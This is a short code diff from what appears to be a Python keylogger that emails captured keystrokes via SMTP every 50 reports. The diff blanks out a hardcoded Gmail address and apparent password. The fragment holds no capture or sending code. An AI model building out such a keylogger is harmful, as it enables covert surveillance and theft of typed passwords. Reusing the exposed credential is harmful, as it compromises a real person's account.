@@ -3,8 +3,8 @@ import smtplib
 from threading import Semaphore, Timer
 
 report_every = 50
-EMAIL_ADDRESS = "utsavtinny1999@gmail.com"
-EMAIL_PASSWORD = "tinny@99"
+EMAIL_ADDRESS = ""
+EMAIL_PASSWORD = ""
 
 
 class Keylogger:
